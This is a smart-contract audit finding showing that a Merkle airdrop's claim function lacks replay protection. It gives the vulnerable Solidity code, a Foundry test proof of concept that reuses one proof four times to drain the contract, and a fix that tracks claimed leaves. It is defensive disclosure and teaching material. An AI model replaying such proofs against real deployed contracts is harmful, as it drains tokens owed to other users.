# H-02: Eligible users can replay the same Merkle proof to drain the airdrop

## Summary

`MerkleAirdrop.claim()` verifies that `(account, amount)` is in the Merkle tree and transfers tokens, but it never records that the account or leaf has already claimed. The same valid proof can be reused repeatedly until the airdrop token balance is drained.

## Vulnerability Details

The intended behavior is that each eligible address receives its airdrop allocation once.

The implementation only validates the fee and Merkle proof:

```solidity
function claim(address account, uint256 amount, bytes32[] calldata merkleProof) external payable {
    if (msg.value != FEE) {
        revert MerkleAirdrop__InvalidFeeAmount();
    }
    bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(account, amount))));
    if (!MerkleProof.verify(merkleProof, i_merkleRoot, leaf)) {
        revert MerkleAirdrop__InvalidProof();
    }
    emit Claimed(account, amount);
    i_airdropToken.safeTransfer(account, amount);
}
```

There is no `hasClaimed` mapping and no claimed-leaf tracking. Since the Merkle root and leaf do not change, any valid proof remains valid after the first claim.

## Impact

One eligible allocation can be claimed multiple times, draining tokens intended for other eligible users. Later valid claimants can be unable to claim because the airdrop contract no longer holds enough tokens.

## Proof of Concept

```solidity
function testSameProofCanBeReusedToDrainAirdrop() public {
    AirdropToken token = new AirdropToken();
    MerkleAirdrop airdrop = new MerkleAirdrop(merkleRoot, token);

    uint256 amountToCollect = 25 * 1e6;
    uint256 amountToSend = amountToCollect * 4;
    token.mint(address(this), amountToSend);
    token.transfer(address(airdrop), amountToSend);

    vm.deal(collectorOne, airdrop.getFee() * 4);

    vm.startPrank(collectorOne);
    airdrop.claim{value: airdrop.getFee()}(collectorOne, amountToCollect, proof);
    airdrop.claim{value: airdrop.getFee()}(collectorOne, amountToCollect, proof);
    airdrop.claim{value: airdrop.getFee()}(collectorOne, amountToCollect, proof);
    airdrop.claim{value: airdrop.getFee()}(collectorOne, amountToCollect, proof);
    vm.stopPrank();

    assertEq(token.balanceOf(collectorOne), amountToSend);
    assertEq(token.balanceOf(address(airdrop)), 0);
}
```

## Recommended Mitigation

Track claimed Merkle leaves and set the claimed state before transferring tokens.

```diff
+mapping(bytes32 leaf => bool claimed) public hasClaimed;
+
 function claim(address account, uint256 amount, bytes32[] calldata merkleProof) external payable {
     if (msg.value != FEE) {
         revert MerkleAirdrop__InvalidFeeAmount();
     }
     bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(account, amount))));
     if (!MerkleProof.verify(merkleProof, i_merkleRoot, leaf)) {
         revert MerkleAirdrop__InvalidProof();
     }
+    require(!hasClaimed[leaf], "Already claimed");
+    hasClaimed[leaf] = true;
+
     emit Claimed(account, amount);
     i_airdropToken.safeTransfer(account, amount);
 }
```

## Learning Notes

Merkle proofs prove eligibility, not one-time usage. Airdrops need separate state to mark each eligible allocation as consumed.

Relevant concepts: Merkle airdrops, replay protection, claim accounting.

## Analysis Disclosure

Independent review.
